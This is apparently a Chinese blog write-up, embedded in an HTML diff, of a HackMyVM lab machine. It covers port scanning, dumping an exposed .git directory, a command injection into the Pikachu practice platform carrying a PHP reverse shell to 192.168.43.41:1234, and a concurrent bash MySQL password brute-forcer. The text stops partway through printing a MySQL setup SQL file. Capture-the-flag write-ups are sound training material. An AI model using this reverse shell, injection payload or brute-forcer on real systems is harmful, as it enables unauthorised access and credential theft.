@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️⭐️
+知识点：信息收集，`MySQL`数据库，`hydra`爆破 ，`docker`提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.43.19   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
+└─# IP=192.168.43.19 
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-24 07:03 EDT
+Nmap scan report for 192.168.43.19 (192.168.43.19)
+Host is up (0.00042s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-git: 
+|   192.168.43.19:9999/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Remotes:
+|_      https://github.com/zhuifengshaonianhanlu/pikachu.git
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Get the pikachu
+MAC Address: 08:00:27:5F:CD:B8 (Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80、9999`端口,`9999`端口提示`git`泄露先取下来没发现啥有用信息
+
+```shell
+GitHack>python3 GitHack.py http://192.168.43.19:9999/.git
+
+http://192.168.43.19:9999/index.php
+Pikachu 漏洞练习平台 pika~pika~
+```
+
+### 3.获得`www-data`权限
+
+再去看看``web:9999`是`Pikachu`漏洞练习平台，`Pikachu`是一个带有漏洞的`Web`应用系统，包含了常见的`web`安全漏洞。">
+<meta property="og:title" content="群友靶机：language 202506024">
+<meta property="og:description" content="
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+```
+
+```shell
+难度：⭐️⭐️
+知识点：信息收集，`MySQL`数据库，`hydra`爆破 ，`docker`提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.43.19   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
+└─# IP=192.168.43.19 
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-24 07:03 EDT
+Nmap scan report for 192.168.43.19 (192.168.43.19)
+Host is up (0.00042s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
+|_http-server-header: Apache/2.4.62 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-git: 
+|   192.168.43.19:9999/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Remotes:
+|_      https://github.com/zhuifengshaonianhanlu/pikachu.git
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Get the pikachu
+MAC Address: 08:00:27:5F:CD:B8 (Oracle VirtualBox virtual NIC)
+```
+
+开放了`22、80、9999`端口,`9999`端口提示`git`泄露先取下来没发现啥有用信息
+
+```shell
+GitHack>python3 GitHack.py http://192.168.43.19:9999/.git
+
+http://192.168.43.19:9999/index.php
+Pikachu 漏洞练习平台 pika~pika~
+```
+
+### 3.获得`www-data`权限
+
+再去看看``web:9999`是`Pikachu`漏洞练习平台，`Pikachu`是一个带有漏洞的`Web`应用系统，包含了常见的`web`安全漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9Alanguage%20202506024.html">
+<meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
+<title>群友靶机：language 202506024</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">群友靶机：language 202506024</h1>
+<div class="title-right">
+    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/10" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>1. 基本信息</h3>
+<pre class="notranslate"><code class="notranslate">靶机链接：
+https://maze-sec.com/library
+https://hackmyvm.eu/machines/machine.php?vm=
+</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️
+知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>MySQL<span class="pl-pds">`</span></span>数据库，<span class="pl-s"><span class="pl-pds">`</span>hydra<span class="pl-pds">`</span></span>爆破 ，<span class="pl-s"><span class="pl-pds">`</span>docker<span class="pl-pds">`</span></span>提权</pre></div>
+<h3>2. 信息收集</h3>
+<h3>Nmap</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+192.168.43.19   08:00:27:5f:cd:b8       PCS Systemtechnik GmbH
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.43.19 </span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-24 07:03 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.43.19 (192.168.43.19)
+Host is up (0.00042s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+<span class="pl-k">|</span> ssh-hostkey: 
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span>_http-title: Site doesn<span class="pl-s"><span class="pl-pds">'</span>t have a title (text/html).</span>
+<span class="pl-s">9999/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="pl-s">|_http-server-header: Apache/2.4.29 (Ubuntu)</span>
+<span class="pl-s">| http-git: </span>
+<span class="pl-s">|   192.168.43.19:9999/.git/</span>
+<span class="pl-s">|     Git repository found!</span>
+<span class="pl-s">|     Repository description: Unnamed repository; edit this file <span class="pl-pds">'</span></span>description<span class="pl-s"><span class="pl-pds">'</span> to name the...</span>
+<span class="pl-s">|     Remotes:</span>
+<span class="pl-s">|_      https://github.com/zhuifengshaonianhanlu/pikachu.git</span>
+<span class="pl-s">| http-cookie-flags: </span>
+<span class="pl-s">|   /: </span>
+<span class="pl-s">|     PHPSESSID: </span>
+<span class="pl-s">|_      httponly flag not set</span>
+<span class="pl-s">|_http-title: Get the pikachu</span>
+<span class="pl-s">MAC Address: 08:00:27:5F:CD:B8 (Oracle VirtualBox virtual NIC)</span></pre></div>
+<p>开放了<code class="notranslate">22、80、9999</code>端口,<code class="notranslate">9999</code>端口提示<code class="notranslate">git</code>泄露先取下来没发现啥有用信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">GitHack<span class="pl-k">&gt;</span>python3 GitHack.py http://192.168.43.19:9999/.git
+
+http://192.168.43.19:9999/index.php
+Pikachu 漏洞练习平台 pika~pika~</pre></div>
+<h3>3.获得<code class="notranslate">www-data</code>权限</h3>
+<p>再去看看``web:9999<code class="notranslate">是</code>Pikachu`漏洞练习平台，`Pikachu`是一个带有漏洞的`Web`应用系统，包含了常见的`web`安全漏洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>php反弹shell</span>
+<span class="pl-c"><span class="pl-c">#</span>参考https://mp.weixin.qq.com/s/jsqxgmnd4Sl2RUyJiyg7FQ</span>
+127.0.0.1<span class="pl-k">|</span>php -r <span class="pl-s"><span class="pl-pds">'</span>$sock=fsockopen("192.168.43.41",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");<span class="pl-pds">'</span></span>
+└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234 </span>
+listening on [any] 1234 ...
+id
+connect to [192.168.43.41] from 192.168.43.19 [192.168.43.19] 36328
+/bin/sh: 0: can<span class="pl-s"><span class="pl-pds">'</span>t access tty; job control turned off</span>
+<span class="pl-s">$ uid=1000(www-data) gid=50(staff) groups=50(staff)</span></pre></div>
+<p>进入<code class="notranslate">Pikachu</code>漏洞练习平台，<code class="notranslate">exec "ping"</code>很容易命令注入，但是很多命令做了限制反弹<code class="notranslate">shell</code>失败（后面知道当前在docker里）,各种尝试后用<code class="notranslate">php</code>成功反弹<code class="notranslate">shell</code></p>
+<h5>测试MYSQL</h5>
+<p>拿到<code class="notranslate">www-data</code>权限后在<code class="notranslate">/tmp</code>目录下发现<code class="notranslate">hint.txt</code>提示信息账户名和</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@b0dd1db70539:ls /tmp
+hint.txt
+phpmyadmin.tar.gz
+tmpe8nqqot2
+tmp.FxoRjQWjAU
+<span class="pl-c"><span class="pl-c">#</span>cat hint.txt</span>
+Maybe passwords are all made up of usernames
+</pre></div>
+<p>看了<code class="notranslate">etc/passwd</code>里可登录账户有个<code class="notranslate">mysql</code>,手动组合了一份由不同账户名重复次数组成的密码字典去尝试爆破mysql服务器以及ssh的密码，AI写了个脚本</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+<span class="pl-c1">set</span> -euo pipefail  <span class="pl-c"><span class="pl-c">#</span> 健壮性设置：错误退出、未定义变量报错、管道错误传递</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 检查字典文件</span>
+PASS_FILE=<span class="pl-s"><span class="pl-pds">"</span>pass.txt<span class="pl-pds">"</span></span>
+<span class="pl-k">if</span> [[ <span class="pl-k">!</span> <span class="pl-k">-f</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PASS_FILE</span><span class="pl-pds">"</span></span> ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>错误: 密码字典文件 <span class="pl-smi">$PASS_FILE</span> 不存在！<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&amp;2</span>
+    <span class="pl-c1">exit</span> 1
+<span class="pl-k">fi</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 并发控制（默认 16 线程）</span>
+MAX_WORKERS=<span class="pl-smi">${1<span class="pl-k">:-</span>16}</span>
+<span class="pl-k">if</span> <span class="pl-k">!</span> [[ <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$MAX_WORKERS</span><span class="pl-pds">"</span></span> <span class="pl-k">=~</span> ^[0-9]+$ ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
+    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>警告: 并发参数非数字，使用默认值 16<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&amp;2</span>
+    MAX_WORKERS=16
+<span class="pl-k">fi</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 目标 MySQL 配置（按需修改）</span>
+MYSQL_USER=<span class="pl-s"><span class="pl-pds">"</span>root<span class="pl-pds">"</span></span>       <span class="pl-c"><span class="pl-c">#</span> 目标用户名</span>
+MYSQL_HOST=<span class="pl-s"><span class="pl-pds">"</span>127.0.0.1<span class="pl-pds">"</span></span>  <span class="pl-c"><span class="pl-c">#</span> 目标主机</span>
+MYSQL_PORT=<span class="pl-s"><span class="pl-pds">"</span>3306<span class="pl-pds">"</span></span>       <span class="pl-c"><span class="pl-c">#</span> 端口</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 密码尝试函数</span>
+<span class="pl-en">try_login</span>() {
+    <span class="pl-k">local</span> password=<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$1</span><span class="pl-pds">"</span></span>
+    <span class="pl-c"><span class="pl-c">#</span> 关键：使用 2&gt;&amp;1 捕获错误输出，避免终端污染</span>
+    <span class="pl-k">if</span> mysql -u <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$MYSQL_USER</span><span class="pl-pds">"</span></span> -p<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password</span><span class="pl-pds">"</span></span> -h <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$MYSQL_HOST</span><span class="pl-pds">"</span></span> -P <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$MYSQL_PORT</span><span class="pl-pds">"</span></span> --connect-timeout=5 -e <span class="pl-s"><span class="pl-pds">"</span>;<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;&amp;1</span> <span class="pl-k">|</span> grep -q <span class="pl-s"><span class="pl-pds">"</span>ERROR<span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-k">then</span>
+        <span class="pl-k">return</span> 1  <span class="pl-c"><span class="pl-c">#</span> 登录失败</span>
+    <span class="pl-k">else</span>
+        <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span>\n[+] 爆破成功！用户名: <span class="pl-smi">$MYSQL_USER</span> 密码: <span class="pl-smi">$password</span><span class="pl-pds">"</span></span>
+        <span class="pl-c1">kill</span> 0  <span class="pl-c"><span class="pl-c">#</span> 终止整个进程组（停止所有并发任务）</span>
+        <span class="pl-c1">exit</span> 0
+    <span class="pl-k">fi</span>
+}
+
+<span class="pl-c"><span class="pl-c">#</span> 并发任务池</span>
+<span class="pl-en">main</span>() {
+    <span class="pl-k">local</span> active_workers=0
+    <span class="pl-k">while</span> <span class="pl-c1">read</span> -r password<span class="pl-k">;</span> <span class="pl-k">do</span>
+        <span class="pl-c"><span class="pl-c">#</span> 等待空闲线程</span>
+        <span class="pl-k">while</span> <span class="pl-s"><span class="pl-pds">((</span> active_workers <span class="pl-k">&gt;=</span> MAX_WORKERS <span class="pl-pds">))</span></span><span class="pl-k">;</span> <span class="pl-k">do</span>
+            <span class="pl-c1">wait</span> -n <span class="pl-k">&amp;&amp;</span> <span class="pl-s"><span class="pl-pds">((</span>active_workers<span class="pl-k">--</span><span class="pl-pds">))</span></span> <span class="pl-k">||</span> <span class="pl-c1">true</span>
+        <span class="pl-k">done</span>
+        
+        <span class="pl-c"><span class="pl-c">#</span> 启动新任务</span>
+        try_login <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$password</span><span class="pl-pds">"</span></span> <span class="pl-k">&amp;</span>
+        <span class="pl-s"><span class="pl-pds">((</span>active_workers<span class="pl-k">++</span><span class="pl-pds">))</span></span>
+        
+        <span class="pl-c"><span class="pl-c">#</span> 打印进度（每 10 次尝试输出一次）</span>
+        <span class="pl-k">if</span> <span class="pl-s"><span class="pl-pds">((</span> <span class="pl-k">++</span>count <span class="pl-k">%</span> <span class="pl-c1">10</span> <span class="pl-k">==</span> <span class="pl-c1">0</span> <span class="pl-pds">))</span></span><span class="pl-k">;</span> <span class="pl-k">then</span>
+            <span class="pl-c1">echo</span> -n <span class="pl-s"><span class="pl-pds">"</span>.<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&amp;2</span>
+        <span class="pl-k">fi</span>
+    <span class="pl-k">done</span> <span class="pl-k">&lt;</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$PASS_FILE</span><span class="pl-pds">"</span></span>
+    <span class="pl-c1">wait</span>  <span class="pl-c"><span class="pl-c">#</span> 等待所有后台任务结束</span>
+    <span class="pl-c1">echo</span> -e <span class="pl-s"><span class="pl-pds">"</span>\n[-] 爆破失败，未找到有效密码！<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&amp;2</span>
+    <span class="pl-c1">exit</span> 1
+}
+
+<span class="pl-c"><span class="pl-c">#</span> 执行主函数</span>
+main
+
+[+] 爆破成功！用户名: root 密码: root</pre></div>
+<p>拿到数据库密码<code class="notranslate">root/root</code>，测试登陆错误的，翻文件最后在<code class="notranslate">/usr/share/mysql/debian_create_root_user.sql</code>，发现<code class="notranslate">root</code>密码为空</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@b0dd1db70539:/app$ find / -name <span class="pl-s"><span class="pl-pds">"</span>mysql<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null 
+/usr/bin/mysql
+/usr/lib/mysql
+/usr/share/mysql
+/usr/share/php7.3-mysql/mysql
+/etc/init.d/mysql
+/etc/mysql
+/var/log/mysql
+/var/lib/mysql
+/var/lib/mysql/mysql
+www-data@b0dd1db70539:/app$ <span class="pl-c1">cd</span> /usr/share/mysql
+www-data@b0dd1db70539:/usr/share/mysql$ ls
+debian_create_root_user.sql  ......
+www-data@b0dd1db70539:/usr/share/mysql$ cat /usr/share/mysql/debian_create_root_user.sql
+-- Get the hostname, <span class="pl-k">if</span> the hostname has any wildcard character like <span class="pl-s"><span class="pl-pds">"</span>_<span class="pl-pds">"</span></span> or <span class="pl-s"><span class="pl-pds">"</span>%<span class="pl-pds">"</span></span>
+-- add escape character <span class="pl-k">in</span> front of wildcard character to convert <span class="pl-s"><span class="pl-pds">"</span>_<span class="pl-pds">"</span></span> or <span class="pl-s"><span class="pl-pds">"</span>%<span class="pl-pds">"</span></span> to
+-- a plain character
+SET @get_hostname= @@hostname<span class="pl-k">;</span>
+SELECT REPLACE<span class="pl-s"><span class="pl-pds">((</span>SELECT REPLACE(@get_hostname<span class="pl-k">,</span>'_'<span class="pl-k">,</span>'\_'<span class="pl-pds">))</span></span>,<span class="pl-s"><span class="pl-pds">'</span>%<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>\%<span class="pl-pds">'</span></span>) INTO @current_hostname<span class="pl-k">;</span>
+
+-- Fill <span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span> table with default users allowing root access
+-- from <span class="pl-k">local</span> machine <span class="pl-k">if</span> <span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span> table didn<span class="pl-s"><span class="pl-pds">'</span>t exist before</span>
+<span class="pl-s">CREATE TEMPORARY TABLE tmp_user LIKE user;</span>
+<span class="pl-s">INSERT INTO tmp_user VALUES (<span class="pl-pds">'</span></span>localhost<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,0,0,0,0,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>N<span class="pl-s"><span class="pl-pds">'</span>);</span>
+<span class="pl-s">REPLACE INTO tmp_user SELECT @current_hostname,<span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,0,0,0,0,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>N<span class="pl-s"><span class="pl-pds">'</span> FROM dual WHERE LOWER( @current_hostname) != <span class="pl-pds">'</span></span>localhost<span class="pl-s"><span class="pl-pds">'</span>;</span>
+<span class="pl-s">REPLACE INTO tmp_user VALUES (<span class="pl-pds">'</span></span>127.0.0.1<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>root<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span class="pl-pds">'</span>,<span class="pl-pds">'</span></span>Y<span class="pl-s"><span 